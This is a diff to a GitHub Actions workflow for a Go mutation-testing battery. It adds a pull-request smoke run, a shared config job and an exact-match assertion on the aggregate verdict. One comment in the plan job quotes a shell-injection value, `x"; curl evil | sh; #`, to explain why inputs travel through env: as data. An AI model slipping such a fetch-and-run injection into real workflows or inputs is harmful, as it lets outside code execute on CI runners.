@@ -24,6 +24,8 @@
 name: Mutation battery
 
 on:
+  # A dispatch is the real thing: an operator names a tip, a table and a
+  # package list.
   workflow_dispatch:
     inputs:
       tip:
@@ -54,6 +56,15 @@ on:
         required: false
         type: string
         default: '20m'
+  # A pull request that touches the harness proves the harness, on a tiny
+  # committed table, through the SAME plan -> arm -> aggregate jobs. A
+  # dispatch cannot be the pre-merge proof: GitHub only registers a
+  # workflow_dispatch workflow once its file is on the default branch, so
+  # this workflow is undispatchable until it merges.
+  pull_request:
+    paths:
+      - '.github/workflows/mutation-battery.yml'
+      - 'scripts/battery/**'
 
 permissions:
   contents: read
@@ -61,15 +72,76 @@ permissions:
 concurrency:
   # One battery per tip at a time. Two dispatches of the same tree would
   # produce two artifact sets that are indistinguishable in the aggregate.
-  group: mutation-battery-${{ inputs.tip }}
-  cancel-in-progress: false
+  # A superseded PR smoke IS cancelled: it is a gate, not a measurement.
+  group: mutation-battery-${{ github.event_name }}-${{ inputs.tip || github.ref }}
+  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
 
 env:
   GO_VERSION: '1.27.0'
 
 jobs:
+  # Resolve, in ONE place, the parameters both events supply differently. The
+  # three jobs below read only these outputs, so the smoke exercises the real
+  # plan/arm/aggregate path rather than a second copy of it that could pass
+  # while the real path is broken.
+  config:
+    name: config
+    runs-on: ubuntu-latest
+    outputs:
+      mode: ${{ steps.c.outputs.mode }}
+      tip: ${{ steps.c.outputs.tip }}
+      packages: ${{ steps.c.outputs.packages }}
+      table_path: ${{ steps.c.outputs.table_path }}
+      table_b64: ${{ steps.c.outputs.table_b64 }}
+      expected_survivors: ${{ steps.c.outputs.expected_survivors }}
+      go_test_timeout: ${{ steps.c.outputs.go_test_timeout }}
+      max_parallel: ${{ steps.c.outputs.max_parallel }}
+    steps:
+      - name: Resolve the run parameters
+        id: c
+        env:
+          EVENT: ${{ github.event_name }}
+          IN_TIP: ${{ inputs.tip }}
+          IN_PACKAGES: ${{ inputs.packages }}
+          IN_TABLE_PATH: ${{ inputs.table_path }}
+          IN_TABLE_B64: ${{ inputs.table_b64 }}
+          IN_EXPECTED: ${{ inputs.expected_survivors }}
+          IN_TIMEOUT: ${{ inputs.go_test_timeout }}
+          PR_HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+        run: |
+          set -euo pipefail
+          if [ "$EVENT" = "pull_request" ]; then
+            # THE SMOKE. A fast single package and a two-row committed table:
+            # one arm that must be KILLED and one that must be a
+            # HARNESS_ERROR. Small enough to be a gate, real enough that every
+            # rule in scripts/battery/ is exercised on the way through.
+            {
+              echo "mode=smoke"
+              echo "tip=$PR_HEAD_SHA"
+              echo "packages=./internal/contextfabric/memorymodelconfig/"
+              echo "table_path=scripts/battery/testdata/smoke.jsonl"
+              echo "table_b64="
+              echo "expected_survivors="
+              echo "go_test_timeout=10m"
+              echo "max_parallel=3"
+            } >> "$GITHUB_OUTPUT"
+          else
+            {
+              echo "mode=dispatch"
+              echo "tip=$IN_TIP"
+              echo "packages=$IN_PACKAGES"
+              echo "table_path=$IN_TABLE_PATH"
+              echo "table_b64=$IN_TABLE_B64"
+              echo "expected_survivors=$IN_EXPECTED"
+              echo "go_test_timeout=$IN_TIMEOUT"
+              echo "max_parallel=50"
+            } >> "$GITHUB_OUTPUT"
+          fi
+          cat "$GITHUB_OUTPUT"
+
   plan:
     name: plan
+    needs: config
     runs-on: ubuntu-latest
     outputs:
       matrix: ${{ steps.plan.outputs.matrix }}
@@ -81,7 +153,7 @@ jobs:
       # actions/checkout v7.0.0
       - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
         with:
-          ref: ${{ inputs.tip }}
+          ref: ${{ needs.config.outputs.tip }}
           persist-credentials: false
 
       - name: Assert the tip is a full sha and is what we checked out
@@ -91,7 +163,7 @@ jobs:
         # of `x"; curl evil | sh; #` would run. Through env: it is only ever
         # data. Same rule in every run: step below.
         env:
-          TIP: ${{ inputs.tip }}
+          TIP: ${{ needs.config.outputs.tip }}
         run: |
           set -euo pipefail
           tip="$TIP"
@@ -106,8 +178,8 @@ jobs:
 
       - name: Resolve the mutant table
         env:
-          TABLE_PATH: ${{ inputs.table_path }}
-          TABLE_B64: ${{ inputs.table_b64 }}
+          TABLE_PATH: ${{ needs.config.outputs.table_path }}
+          TABLE_B64: ${{ needs.config.outputs.table_b64 }}
         run: |
           set -euo pipefail
           p="$TABLE_PATH"
@@ -144,7 +216,7 @@ jobs:
       - name: Derive the func Test floor, with its negative control
         id: floor
         env:
-          PACKAGES: ${{ inputs.packages }}
+          PACKAGES: ${{ needs.config.outputs.packages }}
         run: |
           set -euo pipefail
           # $PACKAGES is intentionally unquoted: it is a package LIST and must
@@ -168,13 +240,13 @@ jobs:
 
       - name: Publish the plan to the job summary
         env:
-          TIP: ${{ inputs.tip }}
-          PACKAGES: ${{ inputs.packages }}
+          TIP: ${{ needs.config.outputs.tip }}
+          PACKAGES: ${{ needs.config.outputs.packages }}
           ARM_COUNT: ${{ steps.plan.outputs.arm_count }}
           MATRIX_SIZE: ${{ steps.plan.outputs.matrix_size }}
           FLOOR: ${{ steps.floor.outputs.floor }}
-          GO_TEST_TIMEOUT: ${{ inputs.go_test_timeout }}
-          EXPECTED_SURVIVORS: ${{ inputs.expected_survivors }}
+          GO_TEST_TIMEOUT: ${{ needs.config.outputs.go_test_timeout }}
+          EXPECTED_SURVIVORS: ${{ needs.config.outputs.expected_survivors }}
         run: |
           {
             echo "### Battery plan"
@@ -202,19 +274,20 @@ jobs:
 
   arm:
     name: arm ${{ matrix.id }}
-    needs: plan
+    needs: [config, plan]
     runs-on: ubuntu-latest
+    timeout-minutes: 30
     strategy:
       fail-fast: false   # one arm's verdict never cancels another's; the
                          # aggregate is the verdict, and a partial matrix is a
                          # harness error rather than a smaller battery.
-      max-parallel: 50
+      max-parallel: ${{ fromJson(needs.config.outputs.max_parallel) }}
       matrix: ${{ fromJson(needs.plan.outputs.matrix) }}
     steps:
       # actions/checkout v7.0.0
       - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
         with:
-          ref: ${{ inputs.tip }}
+          ref: ${{ needs.config.outputs.tip }}
           persist-credentials: false
 
       # actions/setup-go v6.5.0
@@ -255,11 +328,11 @@ jobs:
 
       - name: Run the arm
         env:
-          MB_GO_TEST_TIMEOUT: ${{ inputs.go_test_timeout }}
+          MB_GO_TEST_TIMEOUT: ${{ needs.config.outputs.go_test_timeout }}
           MB_SENTINEL_FILE: ${{ needs.plan.outputs.sentinel_file }}
           MB_ARM_LOG: .battery/out/arm.log
           ARM_ID: ${{ matrix.id }}
-          PACKAGES: ${{ inputs.packages }}
+          PACKAGES: ${{ needs.config.outputs.packages }}
           FLOOR: ${{ needs.plan.outputs.floor }}
         # This step must SUCCEED even when the arm's verdict is bad: the verdict
         # travels as an artifact and the aggregate decides. A failing step here
@@ -287,7 +360,7 @@ jobs:
 
   aggregate:
     name: aggregate
-    needs: [plan, arm]
+    needs: [config, plan, arm]
     # `always()` so a matrix job that died still reaches the aggregate, which
     # reports it as a missing arm -- a HARNESS_ERROR -- instead of the run
     # simply skipping the verdict and looking inconclusive.
@@ -297,7 +370,7 @@ jobs:
       # actions/checkout v7.0.0
       - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
         with:
-          ref: ${{ inputs.tip }}
+          ref: ${{ needs.config.outputs.tip }}
           persist-credentials: false
 
       # actions/download-artifact v6.0.0
@@ -315,9 +388,9 @@ jobs:
       - name: Merge the arms into the one verdict
         id: merge
         env:
-          EXPECTED_SURVIVORS: ${{ inputs.expected_survivors }}
-          PACKAGES: ${{ inputs.packages }}
-          TIP: ${{ inputs.tip }}
+          EXPECTED_SURVIVORS: ${{ needs.config.outputs.expected_survivors }}
+          PACKAGES: ${{ needs.config.outputs.packages }}
+          TIP: ${{ needs.config.outputs.tip }}
           FLOOR: ${{ needs.plan.outputs.floor }}
         run: |
           set -uo pipefail
@@ -355,10 +428,15 @@ jobs:
         # The single verdict. Re-run rather than reading it off the step above,
         # so the workflow's own conclusion comes from the aggregate's rc and not
         # from a captured string that could go stale.
+        #
+        # DISPATCH ONLY. The smoke's expected result contains a HARNESS_ERROR by
+        # construction, so on a pull request this rc is the wrong question and
+        # the smoke-assert job below asks the right one.
+        if: needs.config.outputs.mode == 'dispatch'
         env:
-          EXPECTED_SURVIVORS: ${{ inputs.expected_survivors }}
-          PACKAGES: ${{ inputs.packages }}
-          TIP: ${{ inputs.tip }}
+          EXPECTED_SURVIVORS: ${{ needs.config.outputs.expected_survivors }}
+          PACKAGES: ${{ needs.config.outputs.packages }}
+          TIP: ${{ needs.config.outputs.tip }}
           FLOOR: ${{ needs.plan.outputs.floor }}
         run: |
           python3 scripts/battery/aggregate.py \
@@ -370,3 +448,92 @@ jobs:
             --tip "$TIP" \
             --floor "$FLOOR" \
             --summary-out /dev/null > /dev/null
+
+  smoke-assert:
+    name: smoke assert
+    needs: [config, aggregate]
+    # PULL REQUESTS ONLY. On a dispatch the aggregate's own rc is the verdict;
+    # here the expected result deliberately contains a HARNESS_ERROR, so the
+    # question is not "did anything go wrong" but "did exactly the two things we
+    # planted go wrong, and nothing else".
+    if: always() && needs.config.outputs.mode == 'smoke'
+    runs-on: ubuntu-latest
+    steps:
+      # actions/download-artifact v6.0.0
+      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c
+        with:
+          name: battery-summary
+          path: .
+
+      - name: The smoke's verdict must be EXACTLY the planted one
+        # An assertion on the exact aggregate line, not a substring or a
+        # "contains KILLED" check. The smoke exists to prove the classifier
+        # tells three states apart, so a smoke that would pass on
+        # killed=2 survived=0 harness_error=0 -- the harness silently promoting
+        # a non-compiling mutant to a kill -- proves nothing at all. The ids are
+        # checked too: the right counts reached by the wrong arms is the same
+        # bug wearing a better number.
+        run: |
+          set -uo pipefail
+          echo "----- summary.txt -----"
+          cat summary.txt
+          echo "-----------------------"
+
+          want_line='killed=1 (of which replacement=0) survived=0 harness_error=1'
+          if ! grep -qxF "$want_line" summary.txt; then
+            echo "SMOKE FAILED: the aggregate line is not the planted one."
+            echo "  want (exact): $want_line"
+            echo "  got:          $(grep -E '^killed=' summary.txt || echo '<no killed= line at all>')"
+            exit 1
+          fi
+          echo "ok aggregate line: $want_line"
+
+          fail=0
+          check_state() {  # id expected-state
+            if grep -qE "^$1[[:space:]]+[a-z]+[[:space:]]+$2([[:space:]]|$)" summary.txt; then
+              echo "ok $1 is $2"
+            else
+              echo "SMOKE FAILED: $1 is not $2 -- got: $(grep -E "^$1[[:space:]]" summary.txt || echo '<absent from the table>')"
+              fail=1
+            fi
+          }
+          # The KILL arm deletes a carried field; the HARNESS_ERROR arm is a
+          # replacement that does not compile. Both are in
+          # scripts/battery/testdata/smoke.jsonl.
+          check_state SMOKE_KILL_credential_carry        KILLED
+          check_state SMOKE_HARNESS_ERROR_broken_compile HARNESS_ERROR
+
+          # A kill is only a kill with a named failing test behind it.
+          if grep -qE '^SMOKE_KILL_credential_carry[[:space:]].*--- FAIL: Test' summary.txt; then
+            echo "ok the kill carries a named --- FAIL: Test line"
+          else
+            echo "SMOKE FAILED: the KILLED arm has no named '--- FAIL: Test' in its detail"
+            fail=1
+          fi
+
+          # And the harness error must be the BUILD gate catching it, not a
+          # test that happened to fail.
+          if grep -qE '^SMOKE_HARNESS_ERROR_broken_compile[[:space:]].*BUILD_FAILED' summary.txt; then
+            echo "ok the harness error is BUILD_FAILED, caught before any test result was read"
+          else
+            echo "SMOKE FAILED: the HARNESS_ERROR arm was not classified as BUILD_FAILED"
+            fail=1
+          fi
+
+          for line in 'baseline=PASS' 'sentinel=PASS' 'unexpected_survivors=none'; do
+            if grep -qxF "$line" summary.txt; then echo "ok $line"; else
+              echo "SMOKE FAILED: missing '$line'"; fail=1; fi
+          done
+
+          exit "$fail"
+
+      - name: Publish the smoke verdict
+        if: always()
+        run: |
+          {
+            echo "### Harness smoke"
+            echo
+            echo '```'
+            cat summary.txt 2>/dev/null || echo "no summary artifact -- the aggregate did not run"
+            echo '```'
+          } >> "$GITHUB_STEP_SUMMARY"
